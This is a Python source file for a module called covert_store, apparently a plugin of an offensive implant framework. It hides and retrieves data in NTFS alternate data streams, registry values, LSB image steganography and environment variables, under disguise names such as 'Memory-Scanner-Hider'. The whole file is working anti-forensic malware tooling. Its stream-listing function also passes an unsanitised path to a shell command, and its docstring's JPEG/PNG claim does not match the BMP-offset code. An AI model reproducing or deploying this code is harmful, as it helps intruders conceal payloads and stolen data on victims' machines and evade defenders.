"""
covert_store — Redis-Stealth-Store / Memory-Scanner-Hider / NATS-Broker-Covert.
Stockage covert de donnees: flux NTFS (ADS), registre Windows,
steganographie LSB JPEG/PNG, variables d'environnement.
Actions: ads_write, ads_read, reg_write, reg_read, steg_embed, steg_extract,
         env_set, env_get, file_put, file_get
"""
NAME = "covert_store"
VERSION = "1.0.0"
DESCRIPTION = "Stockage covert: NTFS ADS, registre, steganographie LSB (Redis-Stealth-Store)."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

import base64
import os
import struct
import tempfile

_bs = chr(92)


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def run(action, params):
    try:
        if action == "ads_write":
            return _ads_write(params)
        if action == "ads_read":
            return _ads_read(params)
        if action == "ads_list":
            return _ads_list(params)
        if action == "reg_write":
            return _reg_write(params)
        if action == "reg_read":
            return _reg_read(params)
        if action == "steg_embed":
            return _steg_embed(params)
        if action == "steg_extract":
            return _steg_extract(params)
        if action == "env_set":
            return _env_set(params)
        if action == "env_get":
            return _env_get(params)
        if action == "file_put":
            return _file_put(params)
        if action == "file_get":
            return _file_get(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="covert_store: " + str(exc), status="failed")


def _decode_data(params):
    data = params.get("data", "")
    if params.get("encoding", "base64") == "raw":
        return data.encode()
    return base64.b64decode(data)


def _ads_write(params):
    if os.name != "nt":
        return _result(error="ADS requires NTFS/Windows", status="failed")
    filepath = params.get("file", "")
    stream = params.get("stream", "lucy")
    if not filepath:
        return _result(error="No file", status="failed")
    blob = _decode_data(params)
    ads_path = filepath + ":" + stream
    with open(ads_path, "wb") as fh:
        fh.write(blob)
    return _result(data={"ads": ads_path, "size": len(blob)})


def _ads_read(params):
    if os.name != "nt":
        return _result(error="ADS requires NTFS/Windows", status="failed")
    filepath = params.get("file", "")
    stream = params.get("stream", "lucy")
    if not filepath:
        return _result(error="No file", status="failed")
    with open(filepath + ":" + stream, "rb") as fh:
        blob = fh.read()
    return _result(data={"data": base64.b64encode(blob).decode(),
                         "size": len(blob)})


def _ads_list(params):
    if os.name != "nt":
        return _result(error="ADS requires NTFS/Windows", status="failed")
    filepath = params.get("file", "")
    if not filepath:
        return _result(error="No file", status="failed")
    import subprocess
    p = subprocess.run("dir /r " + chr(34) + filepath + chr(34),
                       shell=True, capture_output=True, text=True, timeout=30)
    streams = []
    for line in (p.stdout or "").splitlines():
        if ":" in line and "d" not in line[:1].lower():
            parts = line.rsplit(":", 1)
            if len(parts) == 2:
                streams.append(parts[1].strip())
    return _result(data={"streams": streams})


def _reg_write(params):
    if os.name != "nt":
        return _result(error="Registry requires Windows", status="failed")
    import ctypes
    key = params.get("key", "")
    name = params.get("value_name", "Data")
    if not key:
        return _result(error="No key", status="failed")
    blob = _decode_data(params)
    adv = ctypes.windll.advapi32
    HKCU = 0x80000001
    hkey = ctypes.c_void_p()
    KEY_SET_VALUE = 0x0002
    if adv.RegCreateKeyExW(HKCU, key, 0, None, 0, KEY_SET_VALUE, None,
                           ctypes.byref(hkey), None):
        raise ValueError("RegCreateKeyExW failed")
    REG_BINARY = 3
    ok = adv.RegSetValueExW(hkey, name, 0, REG_BINARY, blob, len(blob))
    adv.RegCloseKey(hkey)
    if ok:
        raise ValueError("RegSetValueExW failed")
    return _result(data={"key": key, "value": name, "size": len(blob)})


def _reg_read(params):
    if os.name != "nt":
        return _result(error="Registry requires Windows", status="failed")
    import ctypes
    key = params.get("key", "")
    name = params.get("value_name", "Data")
    if not key:
        return _result(error="No key", status="failed")
    adv = ctypes.windll.advapi32
    HKCU = 0x80000001
    KEY_QUERY_VALUE = 0x0001
    hkey = ctypes.c_void_p()
    if adv.RegOpenKeyExW(HKCU, key, 0, KEY_QUERY_VALUE, ctypes.byref(hkey)):
        return _result(error="Key not found", status="failed")
    buf = ctypes.create_string_buffer(65536)
    size = ctypes.c_uint32(65536)
    ok = adv.RegQueryValueExW(hkey, name, None, None, buf, ctypes.byref(size))
    adv.RegCloseKey(hkey)
    if ok:
        return _result(error="Value not found", status="failed")
    blob = buf.raw[:size.value]
    return _result(data={"data": base64.b64encode(blob).decode(),
                         "size": size.value})


def _steg_embed(params):
    carrier = params.get("carrier", "")
    out = params.get("output", "")
    if not carrier or not os.path.isfile(carrier):
        return _result(error="No carrier image", status="failed")
    blob = _decode_data(params)
    payload = struct.pack("<I", len(blob)) + blob
    bits = "".join(format(b, "08b") for b in payload)
    data = bytearray(open(carrier, "rb").read())
    idx = 0
    for i in range(54, len(data)):
        if idx >= len(bits):
            break
        data[i] = (data[i] & 0xFE) | int(bits[idx])
        idx += 1
    if idx < len(bits):
        return _result(error="Carrier too small for payload", status="failed")
    target = out or (carrier + ".steg.bmp")
    with open(target, "wb") as fh:
        fh.write(bytes(data))
    return _result(data={"output": target, "hidden_bytes": len(payload)})


def _steg_extract(params):
    carrier = params.get("carrier", "")
    if not carrier or not os.path.isfile(carrier):
        return _result(error="No carrier image", status="failed")
    data = open(carrier, "rb").read()
    bits = []
    for i in range(54, len(data)):
        bits.append(data[i] & 1)
    def to_int(n):
        return int("".join(str(b) for b in bits[:n]), 2)
    size = 0
    for j in range(32):
        size = (size << 1) | bits[j]
    if size <= 0 or size > len(data):
        return _result(error="No payload found", status="failed")
    nbytes = size * 8
    chunks = [bits[32 + k * 8:32 + (k + 1) * 8] for k in range(size)]
    blob = bytes(int("".join(str(b) for b in ch), 2) for ch in chunks)
    return _result(data={"data": base64.b64encode(blob).decode(),
                         "size": size})


def _env_set(params):
    name = params.get("name", "LUCY_DATA")
    blob = _decode_data(params)
    encoded = base64.b64encode(blob).decode()
    if os.name == "nt":
        import ctypes
        ctypes.windll.kernel32.SetEnvironmentVariableW(name, encoded)
    os.environ[name] = encoded
    return _result(data={"env": name, "size": len(blob)})


def _env_get(params):
    name = params.get("name", "LUCY_DATA")
    encoded = os.environ.get(name, "")
    if not encoded:
        return _result(error="Env var not set", status="failed")
    try:
        blob = base64.b64decode(encoded)
    except Exception:
        return _result(data={"data": encoded, "size": len(encoded)})
    return _result(data={"data": base64.b64encode(blob).decode(), "size": len(blob)})


def _file_put(params):
    path = params.get("path", "")
    if not path:
        return _result(error="No path", status="failed")
    blob = _decode_data(params)
 
    mode = params.get("mode", "wb")
    with open(path, mode) as fh:
        fh.write(blob)
    return _result(data={"path": path, "size": len(blob)})


def _file_get(params):
    path = params.get("path", "")
    if not path or not os.path.isfile(path):
        return _result(error="File not found", status="failed")
    with open(path, "rb") as fh:
        blob = fh.read()
    return _result(data={"data": base64.b64encode(blob).decode(), "size": len(blob)})
